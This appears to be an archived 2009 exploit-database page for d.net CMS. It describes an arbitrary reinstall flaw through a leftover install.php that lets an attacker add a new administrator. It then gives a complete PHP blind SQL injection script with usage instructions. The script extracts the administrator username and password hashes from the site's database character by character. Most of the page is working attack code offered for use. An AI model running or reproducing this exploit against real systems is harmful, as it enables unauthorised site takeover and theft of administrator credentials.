<html><head><title>d.net CMS Arbitrary Reinstall/Blind SQL Injection Exploit</title></head><pre>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-           __           __     _       __                -
+      ____/ /___ ______/ /__  (_)___  / /_____  _____    +
-     / __  / __ `/ ___/ //_/ / / __ \/ //_/ _ \/ ___/    -
+    / /_/ / /_/ / /  / ,&lt;   / / /_/ / ,&lt; /  __/ /        +
-    \__,_/\__,_/_/  /_/|_|_/ /\____/_/|_|\___/_/         -
+                        /___/                            +
-                                                         -
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

[+] Arbitrary Re-Installation Vulnerability

There's no check about the elimination of 'help' directory, 
then whenever an administrator forget to delete it, we can
re-install the CMS, it means we can add a new administrator
account, without specify database's informations.

http://hostname/dnetCMS/help/install.php



[+] Blind SQL Injection Exploit

&lt;?php

function usage () {
	exit (	&quot;\n&quot;.
		&quot;[+] d.net CMS Blind SQL Injection Exploit\n&quot;.
		&quot;[+] Author  : darkjoker\n&quot;.
		&quot;[+] Site    : http://darkjoker.net23.net\n&quot;.
		&quot;[+] Download: https://sourceforge.net/projects/dnet/\n&quot;.
		&quot;[+] Usage   : php xpl.php &lt;hostname&gt; &lt;path&gt;\n&quot;.
		&quot;[+] Ex.     : php xpl.php localhost /dnetCMS/\n&quot;.
		&quot;[+] Greetz  : cristina, puccio (they kept me company when I coded this stuff :D)\n&quot;.
		&quot;\n&quot;);
}

function hex ($string) {
	$i=0;
	while ($i&lt;strlen($string)) 
		$hex .= &quot;%&quot;.dechex(ord($string[$i++]));
	return $hex;
}

function check ($hostname, $path, $character, $position, $field) {
	$character = ord($character);
	$sp = fsockopen ($hostname, 80);
	$query = hex (&quot;'x' OR ASCII(SUBSTRING((SELECT {$field} FROM cms_security_master WHERE id=1),{$position},1))={$character} -- &quot;);
	$request = &quot;GET {$path}index.php?page={$query} HTTP/1.1\r\n&quot;.
		   &quot;Host: {$hostname}\r\n&quot;.
		   &quot;Connection: Close\r\n\r\n&quot;;
	fputs ($sp, $request);
	while (!feof ($sp)) 
		$reply .= fgets ($sp,1024);
	fclose ($sp);
	if ((preg_match (&quot;|Location: index\.php|&quot;, $reply)) || (preg_match (&quot;|&lt;b&gt;Cannot modify&lt;/b&gt;:|&quot;, $reply)))
		return false;
	else
		return true;
}

function get_field ($hostname, $path, $field) {
	echo &quot;[+] &quot;.ucfirst($field).&quot; (hash): &quot;;
	$chars = &quot;abcdef0123456789&quot;;
	for($i=0,$d=1;$d&lt;=32;$i++) {
		if (check ($hostname, $path, $chars [$i], $d, $field)) {
			echo $chars [$i];
			$i = -1;
			$d++;
		}
	}
	echo &quot;\n&quot;;
}

if ($argc != 3)
	usage ();
$hostname = $argv [1];
$path = $argv [2];
$fields = array (&quot;username&quot;, &quot;password&quot;);
foreach ($fields as $field)
	get_field ($hostname, $path, $field);

# milw0rm.com [2009-07-11]</pre></html>